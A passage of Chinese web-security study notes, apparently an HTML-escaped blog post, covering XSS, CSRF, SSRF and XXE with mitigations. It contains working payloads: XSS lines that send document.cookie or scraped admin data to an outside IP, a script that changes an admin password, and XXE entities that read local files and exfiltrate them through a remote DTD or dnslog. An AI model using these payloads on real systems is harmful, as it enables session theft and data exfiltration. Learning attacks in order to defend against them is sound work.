prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;可在审查元素中的console即控制台中输入js代码测试其功能&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;window.location.href=&amp;#x27;http://x.xxx.xx.x/get.php?c=&amp;#x27;+document.cookie&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;script被过滤之后可用其他的标签来进行替换&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;onload事件是浏览器解析完页面之后就会自动触发的事件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img src=1 onerror=window.location.href=&amp;#x27;http://x.xxx.xx.x/get.php?c=&amp;#x27;+document.cookie;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;body onload=1 onerror=window.location.href=&amp;#x27;http://x.xxx.xx.x/get.php?c=&amp;#x27;+document.cookie;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;input onload=&amp;quot;window.location.href=&amp;#x27;http://x.xxx.xx.x/get.php?c=&amp;#x27;+document.cookie;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg onload=&amp;quot;window.location.href=&amp;#x27;http://x.xxx.xx.x/get.php?c=&amp;#x27;+document.cookie;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;空格被过滤的情况下，可以用&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;进行替换&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;后台管理员有功能页面，能够查看注册用户的账号密码 将注册的帐号密码改成JS代码（获取cookie）， 在管理员查看账号密码的时候触发 JS&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg/onload=&amp;quot;window.location.href=&amp;#x27;http://x.xxx.xx.x/get.php?c=&amp;#x27;+document.cookie;&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;后台管理员的cookie的值如果有实效，得到之后很快就不可再次使用，那么可以直接读取后台界面的内容，这里根据html标签匹配到了固定位置的代码，也可以用js代码来获取页面全部的源代码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt; $(&amp;#x27;.laytable-cell-1-0-1&amp;#x27;).each(function(index,value)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if(value.innerHTML.indexOf(&amp;#x27;ctf&amp;#x27;+&amp;#x27;show&amp;#x27;)&amp;gt;-1)&amp;#123; window.location.href=&amp;#x27;http://47.94.236.117/get.php?c=&amp;#x27;+value.innerHTML;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;修改密码的时候抓到了一个url地址，通过此url地址改变了当前用户的密码，可以让管理员以其身份去执行恶意构造的url被动的修改其密码，这也是csrf漏洞；通过js代码新建了一个带有修改管员密码的用户，管员在查看此用户信息的时候就会执行js代码从而密码被改&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;location会重定向动静太大，而src是没有感知的；js需要通过ajax来post数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;src=&amp;#x27;http://127.0.0.1/api/change.php?p=123&amp;#x27;;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;$.ajax(&amp;#123;url:&amp;#x27;http://127.0.0.1/api/change.php&amp;#x27;,type:&amp;#x27;post&amp;#x27;,data:&amp;#123;p:&amp;#x27;123&amp;#x27;&amp;#125;&amp;#125;);&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;xss-修复及防止&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss-修复及防止&#34;&gt;#&lt;/a&gt; XSS 修复及防止&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;过滤一些危险字符，以及转义 &amp;amp; &amp;lt; &amp;gt; &amp;quot; ’ 等危险字符&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;HTTP-only Cookie：用来保护 cookie，防止 cookie 被窃取&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;php.ini 设置：session.cookie_httponly =1&lt;/p&gt;
&lt;p&gt;或代码引用：ini_set (“session.cookie_httponly”, 1);&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;设置 CSP (Content Security Policy)：用来防止内容被外部调用，同时也能防止 xss&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;代码引用：header (&amp;quot;Content-Security-Policy:img-src ‘self’&amp;quot;);&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;输入内容长度限制，实体转义等&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;csrf-ssrf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#csrf-ssrf&#34;&gt;#&lt;/a&gt; CSRF、SSRF&lt;/h3&gt;
&lt;h4 id=&#34;csrf-原理-利用-防御&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#csrf-原理-利用-防御&#34;&gt;#&lt;/a&gt; CSRF 原理 利用 防御&lt;/h4&gt;
&lt;p&gt;（1）CSRF 原理及定义&lt;/p&gt;
&lt;p&gt;a 某登陆自己的后台，b 某引诱 a 某点击自己伪造的网址；b 某在自己的页 面上写上 a 某添加自己后台管理员的数据包；a 某触发该恶意数据包，管理员被添加；即重复发送数据包让受害者利用他的权限请求我们定义的数据包。添加管理员的数据包可以本地搭建相同的 cms 或者框架，并且利用 csrftest 工具截取到执行操作的数据包并构造 url。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;csrftest 工具比较古老了已经，也可以自己抓取捕获敏感流程数据包测试&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;（2）CSRF 的攻击过程两个条件：&lt;/p&gt;
&lt;p&gt;目标用户已经登录了网站，能够执行网站的功能&lt;/p&gt;
&lt;p&gt;目标用户访问了攻击者构造的 URL&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如我正在网站后台执行一些操作，突然一个人发来一个很有诱惑性的地址，我点进去一看什么也不执行，但是此页面却在无形之中给我的网站增加了一个用户或者修改了管理员 密码，可以通过查看 log 中的 POST 数据及增 / 改管理员数据包的线索朔源。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;（3）CSRF 防御策略：&lt;/p&gt;
&lt;p&gt;同源策略，检测来源是否是同一域名，但可以通过抓取数据包修改 Refer 来 源；一是在代码中伪造数据包固定 Refer 来源 (可以写一个 py 脚本自定义数据 包进行伪造)、二是尝试寻找可上传地方，上传 html 的恶意 url 地址。&lt;/p&gt;
&lt;p&gt;加入 token，每次操作都会有一个随机 token，这个 token 是唯一的无法绕过&lt;/p&gt;
&lt;p&gt;加入验证码，但是可以用 burp 的验证码插件完成&lt;/p&gt;
&lt;h4 id=&#34;ssrf-原理-危害-修复&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssrf-原理-危害-修复&#34;&gt;#&lt;/a&gt; SSRF 原理 危害 修复&lt;/h4&gt;
&lt;p&gt;（1）SSRF 原理及定义&lt;/p&gt;
&lt;p&gt;相当于我们以存在 SSRF 这个服务器为跳板进行的一些加载操作，程序写 法不严谨或者过滤不严格，则加载图片地址的这个功能可能就可以包含进行一些恶意的脚本文件。可以在此功能点探测内网服务，识别内网资产，远程下载 木马并直接运行。&lt;/p&gt;
&lt;p&gt;（2）SSRF 的危害：&lt;/p&gt;
&lt;p&gt;加载外部的恶意木马文件执行&lt;/p&gt;
&lt;p&gt;加载内部的敏感文件程序自身的敏感文件&lt;/p&gt;
&lt;p&gt;来访问内网进行内网端口的扫描、获取内网设备信息、枚举内网服务等&lt;/p&gt;
&lt;p&gt;配合 burp 爆破可识别到内网中的信息&lt;/p&gt;
&lt;p&gt;（3）SSRF 支持协议：&lt;/p&gt;
&lt;p&gt;dict, file, ftp, ftps, gopher, http, https, imap, imaps, ldap, pop3, pop3s, rtsp, scp, sftp, smtp, smtps, telnet, tftp&lt;/p&gt;
&lt;p&gt;（3）SSRF 常见安全修复防御方案：&lt;/p&gt;
&lt;p&gt;过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。&lt;/p&gt;
&lt;p&gt;统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。&lt;/p&gt;
&lt;p&gt;限制请求的端口为 http 常用的端口，比如 80,443,8080,8090。&lt;/p&gt;
&lt;p&gt;黑名单内网 ip，避免应用被用来获取获取内网数据，攻击内网。&lt;/p&gt;
&lt;p&gt;禁用不需要的协议，仅仅允许 http/https，防止类似于 file:///,gopher://,&lt;span class=&#34;exturl&#34; data-url=&#34;ZnRwOi8vJUU3JUFEJTg5&#34;&gt;ftp:// 等&lt;/span&gt;。&lt;/p&gt;
&lt;h4 id=&#34;ssrf黑盒测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssrf黑盒测试&#34;&gt;#&lt;/a&gt; SSRF 黑盒测试&lt;/h4&gt;
&lt;p&gt;社交分享功能：获取超链接的标题等内容进行显示&lt;/p&gt;
&lt;p&gt;转码服务：通过 URL 地址把原地址的网页内容调优使其适合手机屏幕浏览&lt;/p&gt;
&lt;p&gt;在线翻译：给网址翻译对应网页的内容&lt;/p&gt;
&lt;p&gt;图片加载 / 下载：例如富文本编辑器中的点击下载图片到本地；通过 URL 地址加载或下载图片&lt;/p&gt;
&lt;p&gt;图片 / 文章收藏功能：主要其会取 URL 地址中 title 以及文本的内容作为显示以求一个好的用具体验&lt;/p&gt;
&lt;p&gt;云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行 ssrf 测试&lt;/p&gt;
&lt;p&gt;网站采集，网站抓取的地方：一些网站会针对你输入的 url 进行一些信息采集工作&lt;/p&gt;
&lt;p&gt;数据库内置功能：数据库的比如 mongodb 的 copyDatabase 函数&lt;/p&gt;
&lt;p&gt;邮件系统：比如接收邮件服务器地址&lt;/p&gt;
&lt;p&gt;编码处理，属性信息处理，文件处理：比如 ffpmg，ImageMagick，docx，pdf，xml 处理器等&lt;/p&gt;
&lt;p&gt;未公开的 api 实现以及其他扩展调用 URL 的功能：可以利用 google 语法加上这些关键字去寻找 SSRF 漏洞&lt;/p&gt;
&lt;p&gt;一些的 url 中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain…&lt;/p&gt;
&lt;p&gt;从远程服务器请求资源（upload from url 如 discuz！；import &amp;amp; expost rss feed 如 webblog；使用了 xml 引擎对象的地方 如 wordpress xmlrpc.php）&lt;/p&gt;
&lt;h3 id=&#34;xml-xxe&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xml-xxe&#34;&gt;#&lt;/a&gt; XML、XXE&lt;/h3&gt;
&lt;h4 id=&#34;xxe-原理-利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xxe-原理-利用&#34;&gt;#&lt;/a&gt; XXE 原理 利用&lt;/h4&gt;
&lt;p&gt;（1）XML/XXE 原理与定义：&lt;/p&gt;
&lt;p&gt;XML 被设计为传输和存储数据，XML 文档结构包括 XML 声明、DTD 文 档类型定义 (可选)、文档元素，其焦点是数据的内容，其把数据从 HTML 分 离，是独立于软件和硬件的信息传输工具。XXE 漏洞全称 XML External Entity Injection，即 xml 外部实体注入漏洞，XXE 漏洞发生在应用程序解析 XML 输入 时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。&lt;/p&gt;
&lt;p&gt;（2）XXE 漏洞利用：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;读取文件：可以用来读取数据库配置文件，/etc/passwd等敏感文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE Mikasa [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY test SYSTEM &amp;quot;file:///d:/e.txt&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;]&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-bash&#34;&gt;&amp;lt;user&amp;gt;&amp;lt;username&amp;gt;&amp;amp;&lt;span class=&#34;built_in&#34;&gt;test&lt;/span&gt;;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;Mikasa&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;带外测试：解决命令执行无回显的问题&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE test [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY % file SYSTEM &amp;quot;curl [http://9v57ll.dnslog.cn&amp;quot;&amp;gt;](http://9v57ll.dnslog.cn&amp;gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;file;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;]&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-bash&#34;&gt;&amp;lt;user&amp;gt;&amp;lt;username&amp;gt;&amp;amp;send;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;Mikasa&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;xml-引用外部实体&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xml-引用外部实体&#34;&gt;#&lt;/a&gt; XML 引用外部实体&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;无回显读文件: 引用外部实体，读取本地文件发送到远程地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;既然这个数据是用脚本语言解析的、那么有没有可能构造 py 代码，直接用 py 代码解析下面的 XML 语言，用来读取到服务器上的数据;肯定是可以的，用 py 来解析 xml 语言获取其中关键信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE ANY[&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY % file SYSTEM &amp;quot;file:///d:/e.txt&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY % remote SYSTEM &amp;quot;http://47.94.236.117/test.dtd&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;remote;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;all;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;]&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-bash&#34;&gt;&amp;lt;root&amp;gt;&amp;amp;send;&amp;lt;/root&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;test.dtd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY % all &amp;quot;&amp;lt;!ENTITY send SYSTEM &amp;#x27;http://47.94.236.117/get.php?file=%file;&amp;#x27;&amp;gt;&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将payload发送到存在xml漏洞的位置，并在远程服务器构造test.dtd和get.php, get.php 读取file数据并记录在本地，漏洞被触发的时候就会在远程生成目录内容为读取到的d:/e.txt。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;其他如可以进行php://filter协议来进行编码绕过&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;xml-测试及防御&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xml-测试及防御&#34;&gt;#&lt;/a&gt; XML 测试及防御&lt;/h4&gt;
&lt;p&gt;（1）XML 测试：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;如果当前关键字Content-Type是xml，可尝试发送xml语言的payload测试；即便此处不是xml依然可以修改类型然后测试。一般的xxe漏洞利用形式如下：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?xml version = &amp;quot;1.0&amp;quot; ?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE ANY [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!ENTITY f SYSTEM &amp;quot;file:///home/ctf/flag.txt&amp;quot; &amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;]&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-bash&#34;&gt;&amp;lt;x&amp;gt; &amp;amp;f; &amp;lt;/x&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;对方后台中有函数可以接受此数据并进行分析如php://input，如果对方数据过滤不严谨，是会执行恶意xml。会有一种情况，输入xxe代码，对方无回显无法确定当前是自己 payload有问题还是不存在漏洞，就可以使用dnslog解决命令执行漏洞无回显问题。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（2）XXE 白盒发现：&lt;/p&gt;
&lt;p&gt;可通过应用功能追踪代码定位审计&lt;/p&gt;
&lt;p&gt;可通过脚本特定函数搜索定位审计&lt;/p&gt;
&lt;p&gt;可通过伪协议玩法绕过相关修复等&lt;/p&gt;
&lt;p&gt;（3）XXE 修复防御方案：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;禁用外部实体&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PHP:libxml_disable_entity_loader(true);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;JAVA:DocumentBuilderFactory dbf=DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Python：from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;过滤用户提交的XML数据：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;过滤关键词：&amp;lt;!DOCTYPE和&amp;lt;!ENTITY，或者SYSTEM和PUBLIC&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
